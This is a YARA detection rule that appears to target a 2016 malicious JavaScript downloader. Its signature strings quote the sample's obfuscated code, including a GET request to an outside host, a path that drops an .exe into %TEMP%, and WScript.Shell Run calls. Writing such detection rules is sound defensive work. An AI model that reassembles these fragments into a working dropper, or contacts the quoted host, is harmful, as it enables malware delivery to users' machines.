rule sig_20160328_f895edb934238880b0f8061ccdbd0e32 {
  meta:
    description = "datamaliciousorder - file 20160328_f895edb934238880b0f8061ccdbd0e32.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "47d1738350a8dd7e2c859e495fda8225b6e5fcf721665b9247a1ea9bafd00e22"

  strings:
    $s1  = "function Kdzzaz() {return Kbawy[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"WKOh2jNuFBSQYo.exe\";};" fullword ascii
    $s2  = "Glhxjfxvr[Hbvfmjbfan](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Uspqpitz](Sthqkcsds() * 11)} while (Glhxjfxvr[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Oqlzkrd(Vawumszfy, Ylwipiao){return Vawumszfy - Ylwipiao;};" fullword ascii
    $s5  = "var Kbawy = function Foqmn() {return WScript[Yunfnhy](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Jixcmd(Xmxpdmjw){Kbawy[\"Run\"](Xmxpdmjw, Pgspln, Pgspln);};" fullword ascii
    $s7  = "function Fvpsam() {return ((Lsvoq == true) && (Lsvoq == Tezmh)) ? 1 : Pgspln;};" fullword ascii
    $s8  = "function Jzdndtd()" fullword ascii
    $s9  = "var Lsvoq = false;" fullword ascii
    $s10 = "Tezmh = true; " fullword ascii
    $s11 = "var Tezmh = false;" fullword ascii
    $s12 = "function Sthqkcsds(){return 22;};" fullword ascii
    $s13 = "Lsvoq = true; " fullword ascii
    $s14 = "function Tukzq(){return Yunfnhy;};" fullword ascii
    $s15 = "return Oqlzkrd(Hvlwbnvobk, Fbqaainpq);" fullword ascii
    $s16 = "var Znesl = new this[\"Date\"]();" fullword ascii
    $s17 = "function Yqhbycufn(Stzpxdv) {var Lpchqmxx = (1, 2, 3, 4, 5, Stzpxdv); return Lpchqmxx;};" fullword ascii
    $s18 = "var Krorhll = false;" fullword ascii
    $s19 = " while (Mlmlfor){" fullword ascii
    $s20 = "} catch(Fynsxbzhg){Mlmlfor = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}